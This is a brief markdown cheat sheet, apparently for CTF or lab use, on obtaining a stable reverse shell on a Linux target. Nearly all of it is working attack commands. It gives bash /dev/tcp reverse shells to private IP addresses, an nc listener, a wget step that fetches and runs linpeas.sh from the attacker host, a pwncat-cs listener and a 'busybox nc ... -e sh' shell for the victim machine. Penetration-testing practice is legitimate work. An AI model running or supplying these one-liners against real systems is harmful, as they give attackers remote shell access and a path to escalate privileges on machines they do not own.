# Linux Reverse Shell

#### we will see that we have a stable shell access

or

**Gaining a stable connection with the use of pwncat-cs**


```
bash -c 'exec bash -i >& /dev/tcp/10.9.1.60/9001 0>&1'
          OR
bash -c 'exec bash -i &>/dev/tcp/10.10.31.62/4444 <&1'

```

> Make sure to run a listener in another terminal to recieve the connection.

```
nc -lnvp 9001
ls -la
wget http://10.9.1.60/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

```

### Shell Access Gained

Gaining a stable connection with the use of `pwncat-cs`
Start a pwncat-cs listener on port 1234 of the attacker machine

```
# Attacker Machine
pwncat-cs -lp 1234

Running a reverse shell command
> busybox(1) - The Swiss Army Knife of Embedded Linux
# Victim Machine
busybox nc attacker-ip port -e sh
```
